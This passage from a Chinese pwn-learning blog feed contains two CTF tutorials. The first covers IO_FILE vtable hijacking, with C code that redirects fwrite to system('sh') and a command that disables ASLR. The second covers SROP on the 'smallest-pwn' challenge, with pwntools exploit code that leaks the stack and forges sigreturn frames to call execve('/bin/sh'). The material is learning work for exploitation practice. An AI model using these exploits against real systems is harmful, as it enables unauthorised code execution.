class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FILE *fp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; *vtable_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fp=fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;123.txt&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rw&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vtable_ptr=*(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;*)((&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)fp+&lt;span class=&#34;number&#34;&gt;0xd8&lt;/span&gt;);     &lt;span class=&#34;comment&#34;&gt;//get vtable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;vtable_ptr: %p\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;*)vtable_ptr);  &lt;span class=&#34;comment&#34;&gt;// 打印vtable_ptr的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;addr1:%p\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;*)vtable_ptr);  &lt;span class=&#34;comment&#34;&gt;// 打印vtable_ptr的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;addr2:%p\n &amp;quot;&lt;/span&gt;,(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;*)vtable_ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vtable_ptr[&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;0x41414141&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//xsputn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;call 0x41414141&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230805203530314.png&#34; alt=&#34;image-20230805203530314&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230805203540676.png&#34; alt=&#34;image-20230805203540676&#34; style=&#34;zoom: 50%;&#34;&gt;



&lt;p&gt;​		但是在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。&lt;/p&gt;
&lt;p&gt;​		vtable_addr[0]位于堆中,可以写,这样就相当于要伪造整个vtable表&lt;/p&gt;
&lt;h3 id=&#34;示例代码&#34;&gt;&lt;a href=&#34;#示例代码&#34; class=&#34;headerlink&#34; title=&#34;示例代码&#34;&gt;&lt;/a&gt;示例代码&lt;/h3&gt;&lt;p&gt;​		system_ptr根据实际情况修改&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; system_ptr 0x7ffff7a523a0;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FILE *fp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; *vtable_addr,*fake_vtable;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fp=fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;123.txt&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rw&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fake_vtable=&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vtable_addr=(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; *)((&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)fp+&lt;span class=&#34;number&#34;&gt;0xd8&lt;/span&gt;);     &lt;span class=&#34;comment&#34;&gt;//vtable offset&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vtable_addr[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)fake_vtable;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(fp,&lt;span class=&#34;string&#34;&gt;&amp;quot;sh&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fake_vtable[&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;]=system_ptr; &lt;span class=&#34;comment&#34;&gt;//xsputn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;hi&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		可以看到伪造效果,vtable被覆盖为堆上的地址了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806114845070.png&#34; alt=&#34;image-20230806114845070&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		 fake_vtable[7]&amp;#x3D;system_ptr; 再把堆上相应内容改成system的地址就可以了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806115013625.png&#34; alt=&#34;image-20230806115013625&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		本地尝试不成功,但在gdb中调试的时候是成功的,怀疑是随机化的问题,关闭随机化就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;gt; /proc/sys/kernel/randomize_va_space &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806114653707.png&#34; alt=&#34;image-20230806114653707&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a href=&#34;#参考链接&#34; class=&#34;headerlink&#34; title=&#34;参考链接&#34;&gt;&lt;/a&gt;参考链接&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_45323960/article/details/123810198&#34;&gt;https://blog.csdn.net/qq_45323960/article/details/123810198&lt;/a&gt;  大部分图都是参考的这个师傅的,写得非常好! 推荐看原文&lt;/p&gt;
&lt;p&gt;ctf-wiki&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/xy_369/article/details/130874848&#34;&gt;https://blog.csdn.net/xy_369/article/details/130874848&lt;/a&gt; &lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-08-07T05:35:58.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-36-SROP/</id>
        <title>pwn入门-36-SROP</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-36-SROP/"/>
        <content type="html">&lt;p&gt;基础看ctf-wiki和《权威指南pwn》&lt;/p&gt;
&lt;p&gt;出自论文: &lt;strong&gt;&lt;code&gt;Framing Signals — A Return to Portable Shellcode&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;理论基础&#34;&gt;&lt;a href=&#34;#理论基础&#34; class=&#34;headerlink&#34; title=&#34;理论基础&#34;&gt;&lt;/a&gt;理论基础&lt;/h1&gt;&lt;p&gt;32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)&lt;/p&gt;
&lt;h2 id=&#34;攻击条件&#34;&gt;&lt;a href=&#34;#攻击条件&#34; class=&#34;headerlink&#34; title=&#34;攻击条件&#34;&gt;&lt;/a&gt;攻击条件&lt;/h2&gt;&lt;p&gt;1.栈溢出,且大小足够&lt;/p&gt;
&lt;p&gt;2.知道以下内容地址&lt;/p&gt;
&lt;p&gt;“&amp;#x2F;bin&amp;#x2F;sh”、signal frame、syscall、sigreturn&lt;/p&gt;
&lt;p&gt;对sigreturn, 只要rax&amp;#x3D;15(64位下),执行syscall即可,rax可以通过一些方式来间接控制,比如作为read的返回值(读取的字节数)&lt;/p&gt;
&lt;h1 id=&#34;例题-360-春秋杯-smallest-pwn&#34;&gt;&lt;a href=&#34;#例题-360-春秋杯-smallest-pwn&#34; class=&#34;headerlink&#34; title=&#34;例题  360 春秋杯  smallest-pwn&#34;&gt;&lt;/a&gt;例题  360 春秋杯  smallest-pwn&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729163815299.png&#34; alt=&#34;image-20230729163815299&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		这个不能用正常程序的流程来看待,就这几行汇编, 首先向栈顶读取了0x400字符,然后ret, 又会从栈顶取值作为下一条指令.&lt;/p&gt;
&lt;p&gt;​		程序中没有sigreturn系统调用,但是有read,通过read可以控制rax寄存器的值, 然后再调用syscall即可,换句话说,其实可以调用任意的系统调用(不考虑其他寄存器是否满足条件)&lt;/p&gt;
&lt;p&gt;​		execve(“&amp;#x2F;bin&amp;#x2F;sh”,0,0) 最终的目标是要执行这个, 但现在最大的问题是, &lt;font color=&#34;red&#34;&gt;不知道”&amp;#x2F;bin&amp;#x2F;sh”的地址,&lt;/font&gt;所以需要想办法泄露栈地址,然后输入到这个确定的地址上面.&lt;/p&gt;
&lt;h2 id=&#34;攻击步骤&#34;&gt;&lt;a href=&#34;#攻击步骤&#34; class=&#34;headerlink&#34; title=&#34;攻击步骤&#34;&gt;&lt;/a&gt;攻击步骤&lt;/h2&gt;&lt;h3 id=&#34;1-泄露地址&#34;&gt;&lt;a href=&#34;#1-泄露地址&#34; class=&#34;headerlink&#34; title=&#34;1.泄露地址&#34;&gt;&lt;/a&gt;1.泄露地址&lt;/h3&gt;&lt;p&gt;​		因为ret后从rsp取值,所以rsp这里要放几个程序的起始地址start_addr,然后首先要利用write输出栈的地址,可以看到这两句指令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mov rsi,rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov rdi,rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		如果利用之前的read把rax控制为1,那么就可以调用write的系统调用了,而rsi正好是rsp,所以可以输出一个rsp中的一个栈指针,理论上也是指向栈的某个位置.&lt;/p&gt;
&lt;p&gt;​		&lt;strong&gt;要执行write的话,需要跳过xor这条指令,所以是不是应该在rsp上放一个0x400b3,也就是xor下一条指令的地址呢? 理论上需要,其实也不用,因为在输入一个字符的时候,可以输入\xb3, 这样把rsp上原先存放的start_addr地址的最后一个字节改了,也可以实现这个效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729115321236.png&#34; alt=&#34;image-20230729115321236&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) * &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\xb3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack_addr = u64(sh.recv()[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;leak stack addr :&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stack_addr))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		在输出的时候可以看到第二个地址才是栈上地址,所以取值[8:16], &lt;strong&gt;为啥rsp上面要放3三个初始地址呢?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		第一个用来读入 \xb3,  第二个时 进入了write,泄露地址, 第三个该继续走下面流程了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729164917698.png&#34; alt=&#34;image-20230729164917698&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;h3 id=&#34;2-构造frame-实现读入已知地址的功能&#34;&gt;&lt;a href=&#34;#2-构造frame-实现读入已知地址的功能&#34; class=&#34;headerlink&#34; title=&#34;2.构造frame: 实现读入已知地址的功能&#34;&gt;&lt;/a&gt;2.构造frame: 实现读入已知地址的功能&lt;/h3&gt;&lt;p&gt;​		刚开始非常纳闷…这段汇编给的就是read的汇编,为啥要用frame构造啊….&lt;font color=&#34;red&#34;&gt;后来想明白后,还是自己太想当然了,前面给的read的汇编是不知道rsp的地址的,通过构造的frame,在恢复的时候,可以指定rsp的值,这样才能知道&amp;#x2F;bin&amp;#x2F;sh的地址(或许可以暴力破解?&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0x400&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## set rax=15 and call sigreturn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigreturn = p64(syscall_ret) + &lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		7个b不会影响吗??? 会覆盖sigframe的开头,&lt;font color=&#34;red&#34;&gt;但是不知道覆盖的哪个寄存器????,不过看结果是没影响的&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&#34;3-读如execve的frame-然后执行&#34;&gt;&lt;a href=&#34;#3-读如execve的frame-然后执行&#34; class=&#34;headerlink&#34; title=&#34;3. 读如execve的frame,然后执行&#34;&gt;&lt;/a&gt;3. 读如execve的frame,然后执行&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sigframe = SigreturnFrame()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rax = constants.SYS_execve&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdi = stack_addr + &lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# &amp;quot;/bin/sh&amp;quot; &amp;#x27;s addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsi = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rdx = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rsp = stack_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sigframe.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame_payload = p64(start_addr) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;b&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(sigframe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = frame_payload + (&lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt;-&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(frame_payload))*&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(sigreturn)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		与2原理一样,读入frame,然后执行&lt;/p&gt;
